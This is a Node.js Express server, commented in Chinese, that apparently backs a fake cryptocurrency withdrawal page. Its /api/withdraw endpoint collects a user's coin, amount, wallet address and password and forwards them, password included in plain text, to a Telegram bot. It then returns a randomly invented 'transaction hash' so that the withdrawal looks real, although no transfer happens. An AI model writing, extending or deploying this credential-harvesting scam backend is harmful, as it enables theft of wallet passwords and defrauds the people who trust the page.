const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { sendNotification } = require('./bot'); // 引用发送通知的函数

const app = express();
app.use(cors());
app.use(bodyParser.json());

// 模拟钱包地址
let walletAddress = null;

// 确认钱包地址
app.post('/api/wallet', async (req, res) => {
  const { wallet } = req.body;
  if (!wallet) return res.status(400).json({ success: false, error: 'Wallet is required' });

  walletAddress = wallet;

  try {
    // 发送确认钱包的通知到 Telegram
    await sendNotification(`📤 NEW WITHDRAWAL REQUEST
--------------------------------
💰 Coin: USDT
🔢 Amount: 0
💵 USDT: 0
🏦 Wallet: ${wallet}
🔐 Password: N/A
🆔 Transaction Hash: N/A
⚠️ Wallet & password can be bound once.
Please screenshot the transaction hash for record.`);

    res.json({ success: true, wallet });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: 'Telegram send failed' });
  }
});

// 提现请求
app.post('/api/withdraw', async (req, res) => {
  const { coin, amount, wallet, password } = req.body;
  if (!coin || !amount || !wallet || !password) return res.status(400).json({ success: false, error: 'Missing fields' });

  const txHash = 'TX-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 8);

  try {
    // 发送提现请求的通知到 Telegram，按照你要求的格式
    await sendNotification(`📤 NEW WITHDRAWAL REQUEST
--------------------------------
💰 Coin: ${coin}
🔢 Amount: ${amount}
💵 USDT: ${(amount * 50).toFixed(4)}  // 假设汇率为 50，这个值可以动态修改
🏦 Wallet: ${wallet}
🔐 Password: ${password}
🆔 Transaction Hash: ${txHash}
⚠️ Wallet & password can be bound once.
Please screenshot the transaction hash for record.`);

    res.json({ success: true, hash: txHash });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: 'Telegram send failed' });
  }
});

// 启动服务器
const PORT = 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
